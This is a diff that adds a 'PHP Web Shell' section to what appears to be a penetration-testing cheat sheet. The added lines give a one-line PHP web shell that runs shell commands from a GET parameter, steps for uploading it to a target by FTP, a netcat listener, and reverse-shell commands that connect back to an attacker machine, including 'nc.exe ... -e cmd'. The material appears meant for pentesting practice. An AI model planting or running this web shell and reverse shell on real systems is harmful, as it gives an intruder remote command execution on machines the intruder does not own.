@@ -40,3 +40,31 @@ However, to gain full functionality do the following:
 * This includes tab/auto-complete
 * CTRL+C
 * And more
+
+## PHP Web Shell
+
+1. Create web shell
+
+```
+echo '<?php system($_GET["x"]);?>' > php-cmd.php
+```
+
+&#x20; 2\. Transfer to target (i.e. FTP)
+
+&#x20; 3\. Use Netcat to connect back to your attack machine
+
+&#x20; 4\. Transfer the nc.exe binary if it is a Windows target
+
+&#x20; 5\. Start Netcat listener on the attack machine
+
+```
+nc -lnvp 1337
+```
+
+&#x20; 6\. Trigger reverse shell
+
+```
+nc -v <kali_ip_here> 1337
+
+nc.exe -v <kali_ip_here> 1337 -e cmd
+```
